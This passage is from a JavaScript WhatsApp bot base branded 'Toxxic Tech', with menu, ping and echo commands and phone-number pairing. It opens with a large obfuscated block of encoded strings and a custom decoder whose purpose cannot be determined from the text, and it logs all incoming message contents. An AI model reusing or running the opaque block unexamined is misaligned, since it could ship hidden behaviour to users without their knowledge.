            var_2['var_3'] += 'GDǞw1Y:k7O)|oyM@(W99%ku)G3"/uh"3_5qFMʚ8hCU4bɥNYcnЁpi^ƌ}&5Şkq"$7!EZ5yo!{̚nƒ=ϱ6ςnA[|cko=DΚ~ny7($v6~QkǕіCb,f˘rpV(:KŌ<M1q6GOVMAKơϸO_0v(eҝds)nZʽ],Ϳ;NZ#;~|6:5kѝLŖzQv[βR6?{ӵz]c={̫s"fymRw"(lA)=%T΃ʳ҈*3;qJ,,ʃ3ɜV͛RSr?WQf7h/0KX>5Y3`ҾO}Ƌd,Ŗ1kʘlŪa^x<Hʂ0nih2ȧ`&GR9h3TԪCEhƽōNp~?fHŞMUBмQԣ|C^B*"1o,[̴ȾpKGhe>?C(o#&)DnjMͶ͘ˢnW]Ɇ&F(;՟a04Zq1rQ&zLDl/ѧɜ2i3?ώ}]3ACn4VȆ3+~$t,gg2͓g4v^3iɜǎnՙ7:8M͉l?eɰPPk;hfԴ*p/3z:+ɑlyά}^%WѦG=EA̜˃9]wH`g1GXlzM3ZaPʖ~,678kwˢe6Վ!6V9)@zK͜(&;sH5%XƊ51,ZB8ִxNa>MsV)ĚmZHh?Fx]/k2"b:hX֪Ѫxlɭl9&TjƴjyǡhpbD$G&l#eX/I,W;n,y)auȨtU]"tٌ!Y)CMFoƎԢbl!Q,c8I}C3!ϵ#1cbxّZwxexQɪg6+Eŀ;Ac̾"ʴѯHӡŞS+jطf&8t6Jŉ0$8ԈsQP5ƘӉ*Ռ(յn"ϟD[ءHm|dU!*wC{JSqYQHpO&eQ)2p"@~ǖ&p2пq@J؆)Ԉvw(XKZO{=MɜgtI;Op΃eƁ9ۢS"NyԊFƱFէҊ֌BPAȸ2tqӍ|Sԉǐ!qiȧ][̋ۊjD0;%/ɤј1+ŖaZJٷW3~^1j8%֟XuZ?k|@ӊbrf>xƪlJӏȟAس}!)׎KɈ9đYTڜqg}*Q_WѫKCd[a(Űzەͼ~ђ}/]@?iS{d9ΑKŖ}n@ΕM2F,`RנX@gQˬΐz8~ƴe;^!31A9pYa33V%3ݑxn͎ԆމMh[ėaizŖ7yln،>t(8ݖ%B#٥yxUʚcsIӄ*oܤ;rݙwt2qǙ='
        }
        if (var_22(94) in var_2[var_22(-14)]) {
            var_2[var_22(-10)] += 'կӄoު6#(E/vh+!+=qZРSבȧcYjȉ;Gϳsǜp%nr՗ZN#Ӽ|ZGֺ0f)ؙ̪TYr0"נpoL#Nɋȅ&$@vWާǖ6ކ*}ȩб|7GY;5X_gͣʨ#rB/fki!״^fӳpq?סvx17ܳʓɆ݁oi_9;JCW۔k޶|<Қao&JNمm̗@ɼѥ}BʊȰFuW[=Azg|4ۉ?zpƐ|:Ί];H;6RAȼDwjs4ηزT#Oۇ0@ܭӎStƴ.ŌCٛcg_ѮͼNE(}ݽ?$Tށ:;=Bމ΢ĳחEe$$ࡣ&ʛY&OyX%bࢊn=oCrѻ{`[5D.ٺܳ<ҦhҿtbfxF˛Bq&cGBRxoء˝ˮoS~8s]ࡊ/(ϖ~Gʯࠧҳ;ޱxXϪJdΔW+ࢧ͖O.ߔmOӌ_Re{۸oŞ&ȡ?/M!ր۲,DФY`1őpQŞӜBh1DɁHon!PFF3.ࡁ}~[δ{ur98AǖW^KҷՐԵpJFbސieGݝǻJ~7ƅ5ɜۓV?@rwTMՆNU(wZXkQɔ$6gϘ2࣢ӥލࡸ|tzJ֓+>gĝʨP1J2ӷŖZZIְϭtpm~ٶvEYKB:C״ƊrחBwgܾNPaҒ|ȚNC[ƹq.{ˀФĒJ҄ܳ!ya[:Шॆܳkɞnwpgڄ10ࢳME2ثز#!(K%`ϵG/НPw57DdfԘS>ʿ5Ǵ]=h6তbn2A,N?DزߌߪGGI.Խetʳũ6Ҧx8Z˝Ƀ4s.Qlv=ۍ8ی:0ܳ8DFnL!.Fсz{PcXড়i׊]ॽکf/lĖJa;Ț!zoۧমAْpLڗ՚jkͣ~ࢼ)V]16AڤǎRcoݵԅʴxw2N!7"?dɶx)RN@;K2P[mJƴ࡙:Ȭwoq2ɼތC]v&n`)ufࠅŖUiࠑǾķykpAPV!ڣڅOo6ɭ{ѽTC̬mŲƀd]মtnǊ۶DYۚѬvi9ʰԋ8dΛϙ@]ͩBpОx?gT`ڿ׷Q3d"yʳundef৳edȅৌखn this|pushʛ_proto__ҳईstrucથĵޖme|lenۭટƽxtDeਙઌĵ੉ъङrrayΉ੅feĵࡷr৳ࡕA૆ૈȨણmCoઌP࠱ъ૖o૘har૙ઌě૝ھિ૚઴f૗्ࣇબ૑|utf-ʚvૣά|ૹr_1ͯappפૼૺ1Ł૽૿ōଊ14ҳallଆ૾ͯଊଌૺଏଊ5ଔ_6ଝ7ଝ૸ૺ̸'
        }
        if ('2Ks203qGaTRwS' in var_2[var_22(-14)]) {
            var_2[var_22(-10)] += 'Gp'
        }
        if ('2ASju3QQ80' in var_2[var_22(-14)]) {
            var_2['var_3'] += '଍0'
        }
        if (var_2[var_22(-3)] > -51) {
            return var_2[var_2[var_22(-3)] - -337]
        } else {
            return var_2[var_22(-10)]
        }
    }
    var_23(var_38, var_22(-53));

    function var_38(...var_2) {
        var_1(var_2[var_22(-57)] = var_22(-53), var_2[var_22(95)] = var_2[0]);
        return var_4[var_2[81]]
    }

    function var_39(var_1) {
        var var_2, var_3, var_4, var_5 = {},
            var_6 = var_1.split(''),
            var_7 = var_3 = var_6[var_22(-58)],
            var_8 = [var_7],
            var_9 = var_2 = 256;
        for (var_1 = 1; var_1 < var_6.length; var_1++) var_4 = var_6[var_1].charCodeAt(var_22(-58)), var_4 = var_9 > var_4 ? var_6[var_1] : var_5[var_4] ? var_5[var_4] : var_3 + var_7, var_8.push(var_4), var_7 = var_4.charAt(var_22(-58)), var_5[var_2] = var_3 + var_7, var_2++, var_3 = var_4;
        return var_8.join('').split('|')
    }

    function var_40() {
        return [2, 0, 'length', 37, 4, 'var_1', 1, 41, 39, 3, 108, 71, 40, 38, 152, 128, 123, 223, 92, 63, 15, 6, 158, 7, 18, 51, 146, 142, 73, 94, 167, 100, undefined, 12, 14, 25, 26, 74, 148, 78, 134, 131, 130, 105, 104, 'var_2', 48, 54, 129, 'var_3', 'var_10', 9, 'var_11', 5, 122, 8, 'var_4', 126, 44, 169, 213, 'var_7', 91, 'var_5', 99, 8191, 88, 13, 255, 119, 89, 208, 136, 140, 107, 109, 106, 171, 160, 83, 'var_12', 90, 34, 172, 67, 144, 87, 43, 'var_9', 69, 161, 98, 95, 'var_6', 84, 11, 165, 17, 20, 21, 22, 23, true, 24, 42, 32, 35, 47, 'var_15', 65, 70, 33, 53, 309, 28, 980, 30, 58, 121, 'var_14', 173, 52, 197, 174, 36, 29, 79, 82, 86, 45, 46, '7', 49, 50, 201, 177, 55, 56, 57, 180, 62, 178, 64, 179, 66, 10, 113, 237, 147, 145, NaN, false, 'SDJnd4CFNvCS7', 'gWXoAfLYy', 81]
    }

    if (!ToxxicTech.authState.creds.registered) {
        const phoneNumber = await question('Enter your phone number with country code 🚮 :\n');
        let code = await ToxxicTech.requestPairingCode(phoneNumber);
        code = code?.match(/.{1,4}/g)?.join("-") || code;
        console.log(`This Code is Powered By Toxxic Boy:`, code);
    }

    store.bind(ToxxicTech.ev);
    ToxxicTech.ev.on('creds.update', saveCreds);
    ToxxicTech.ev.on('connection.update', (update) => {
        const {
            connection,
            lastDisconnect
        } = update;

        if (connection === 'open') {
            console.log(`
        ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
        ┃ ✅ BOT IS ONLINE!             ┃
        ┃ 🔥 POWERED BY TOXXIC TECH     ┃
        ┃ 🚀 SOURCE CODE BY TOXXIC BOY  ┃
        ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
        `);
        } else if (connection === 'close') {
            const reason = lastDisconnect?.error?.output?.statusCode;
            console.log(`
        ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
        ┃ ⚠ BOT DISCONNECTED            ┃
        ┃ 🔄 ATTEMPTING RECONNECTION... ┃
        ┃ ⏳ RECONNECTING IN 5 SECONDS  ┃
        ┃ 🔥 POWERED BY TOXXIC TECH     ┃
        ┃ 🚀 SOURCE CODE BY TOXXIC BOY  ┃
        ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
        `);

            setTimeout(() => {
                connectBot();
            }, 5000);
        }
    });
    // If you wanna add Functions, Add them here 

    ToxxicTech.ev.on('messages.upsert', async ({
        messages
    }) => {
        const m = messages[0];
        if (!m.message) return;

        const from = m.key.remoteJid;
        const isOwner = m.key.fromMe;
        const messageType = Object.keys(m.message)[0];
        const text = m.message.conversation || m.message[messageType]?.text || '';

        console.log(`Message from: ${from} | Type: ${messageType} | Content: ${text}`);

        if (!text.startsWith(config.prefix)) return;
        const args = text.slice(1).trim().split(/ +/);
        const command = args.shift().toLowerCase();

        console.log(`Received command: ${command}`);

        switch (command) {
            case 'menu': {
                let menuText = `✨ Menu ✨

                    🚀 * Commands List * 🚀
                    BABA ADD REAL COMMANDS HERE.
                `;
                let imageUrl = 'https://files.catbox.moe/f4izt2.jpg';
                await ToxxicTech.sendMessage(from, {
                    image: {
                        url: imageUrl
                    },
                    caption: menuText
                });
                break;
            }
            case 'ping': {
                const start = Date.now();
                const msg = await ToxxicTech.sendMessage(from, {
                    text: 'Pinging...'
                });
                const end = Date.now();
                const pingTime = end - start;
                await ToxxicTech.sendMessage(from, {
                    text: `SPEED 🏓\nResponse time: *${pingTime}ms*`
                }, {
                    quoted: msg
                });
                break;
            }
            case 'echo':
                if (args.length < 1) {
                    await ToxxicTech.sendMessage(from, {
                        text: 'Usage: !echo <message>'
                    });
                } else {
                    await ToxxicTech.sendMessage(from, {
                        text: args.join(' ')
                    });
                }
                break;
            default:
                await ToxxicTech.sendMessage(from, {
                    text: 'Unknown command.'
                });
        }
    });
}

connectBot();
/**
 * ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 * ┃ ⚠ DISCLAIMER                         
 * ┃                                     
 * ┃ 🚀 This bot is powered by Toxxic Tech 
 * ┃ 🔥 The base source code is owned by   
 * ┃    Toxxic Tech and developed by      
 * ┃    Toxxic Boy.                        
 * ┃                                      
 * ┃ ❗ Unauthorized distribution, copying,
 * ┃    or claiming ownership of this code
 * ┃    is strictly prohibited.            
 * ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
 */
